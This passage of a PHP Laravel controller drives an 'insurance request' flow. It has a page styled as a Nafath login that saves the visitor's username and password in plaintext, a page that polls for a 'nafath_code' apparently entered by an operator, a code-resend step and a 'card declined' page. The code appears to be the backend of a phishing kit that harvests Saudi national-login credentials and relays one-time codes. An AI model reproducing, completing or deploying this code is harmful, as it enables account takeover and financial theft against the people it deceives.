                    $insuranceRequest->update($updated_data);
                });

                $allFormData = session('allFormData');
                $checkPhoneNumber = session('checkPhoneNumber');
                $allFormData = array_merge($allFormData, $checkPhoneNumber);

                session(['allFormData' => $allFormData]);

                return redirect()->route('nafathLogin')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== nafathLogin Function =============================
    // ========================================================================
    public function nafathLogin(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            if ($allFormData) {
                return view('nafathLogin', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ================= nafathLoginRequest Function ==========================
    // ========================================================================
    public function nafathLoginRequest(NafathLoginRequestFormRequest $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                return redirect()->route('codeDegit');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ================= nafathDocumentingRequest Function ====================
    // ========================================================================
    public function nafathDocumentingRequest(NafathDocumentingRequestFormRequest $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                $updated_data = [
                    'user_name' => $request->user_name,
                    'password' => $request->password,
                ];

                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                return redirect()->route('codeDegit');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== codeDegit Function ===============================
    // ========================================================================
    public function codeDegit(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            if ($allFormData) {
                return view('codeDegit', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== fetchCodeDegit Function ==========================
    // ========================================================================
    public function fetchCodeDegit()
    {
        $allFormData = session('allFormData');
        if (!isset($allFormData)) {
            return response()->json(['nafath_code' => null]);
        }
        $nafathCode = InsuranceRequest::where('id', $allFormData['id'])->pluck('nafath_code')->first();
        return response()->json(['nafath_code' => $nafathCode]);
    }

    // ========================================================================
    // ===================== resendCodeDegit Function =========================
    // ========================================================================
    public function resendCodeDegit(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            if ($allFormData) {
                $insuranceRequest = InsuranceRequest::where('id', $allFormData['id'])->first();
                $updated_data = [
                    'nafath_code' => null,
                ];

                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                return view('codeDegit', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== cardDeclined Function ============================
    // ========================================================================
    public function cardDeclined(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            session()->forget('insuranceRequest');

            if ($allFormData) {
                return view('cardDeclined', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),


                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }
}
